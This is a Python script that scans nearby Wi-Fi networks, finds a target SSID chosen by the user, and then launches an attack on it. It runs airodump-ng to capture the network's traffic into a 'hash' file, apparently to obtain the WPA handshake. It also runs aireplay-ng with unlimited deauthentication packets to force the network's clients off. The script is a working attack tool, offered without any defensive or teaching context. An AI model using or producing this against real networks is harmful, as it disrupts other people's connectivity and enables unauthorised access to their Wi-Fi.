import subprocess
import time
import re

def get_interface():
    interface = input("Enter the network interface (e.g., wlan0, eth0): ")
    return interface

def get_target_ssid():
    ssid = input("Enter the SSID you want to look up: ")
    return ssid

def scan_wifi(interface):
    command = ['iwlist', interface, 'scan']
    try:
        scan_output = subprocess.check_output(command, universal_newlines=True)
        return scan_output
    except subprocess.CalledProcessError as e:
        print(f"Failed to scan networks: {e}")
        return None

def parse_networks(scan_data):
    network_dict = {}
    current_network = {}
    for line in scan_data.splitlines():
        if 'Cell' in line:  # New network block starts
            if current_network:  # If there's accumulated network info, write it down
                essid = current_network.get('ESSID', None)
                if essid:
                    network_dict[essid] = current_network
                current_network = {}

        if 'Address' in line:
            current_network['MAC'] = line.split(' ')[-1].strip()
        elif 'ESSID' in line:
            essid = line.split(':')[1].strip().strip('"')
            current_network['ESSID'] = essid
        elif 'Frequency' in line:
            match = re.search(r'(\d+\.\d+) GHz \(Channel (\d+)\)', line)
            if match:
                current_network['Channel'] = match.group(2)
        elif 'Quality' in line or 'Signal level' in line:
            signal_strength = line.split('=')[1].split(' ')[0]
            current_network['Signal Strength'] = signal_strength
        elif 'Encryption key' in line:
            current_network['Security'] = 'Encrypted' if 'on' in line else 'Open'
        elif 'IE: IEEE' in line and ('WPA' in line or 'WPA2' in line):
            security_type = line.split(':')[1].strip()
            current_network['Security'] = security_type

    # Check the last network too
    if current_network and 'ESSID' in current_network:
        essid = current_network['ESSID']
        network_dict[essid] = current_network

    return network_dict

def main():
    interface = get_interface()
    target_ssid = get_target_ssid()

    while True:
        scan_data = scan_wifi(interface)
        if scan_data:
            networks = parse_networks(scan_data)
            if target_ssid in networks:
                network_info = networks[target_ssid]
                print(f"Details for SSID '{target_ssid}': {network_info}")
                
                # Open terminal to run airodump-ng
                airodump_command = f'gnome-terminal -- bash -c "airodump-ng -c {network_info['Channel']} -w hash --bssid {network_info['MAC']} {interface}; sleep 30; exit"'
                subprocess.Popen(airodump_command, shell=True)

                # Open terminal to run aireplay-ng
                aireplay_command = f'gnome-terminal -- bash -c "aireplay-ng -0 0 -a {network_info['MAC']} {interface}; sleep 30; exit"'
                subprocess.Popen(aireplay_command, shell=True)

                time.sleep(30)  # Keep running the commands for 30 seconds
                break

if __name__ == "__main__":
    main()
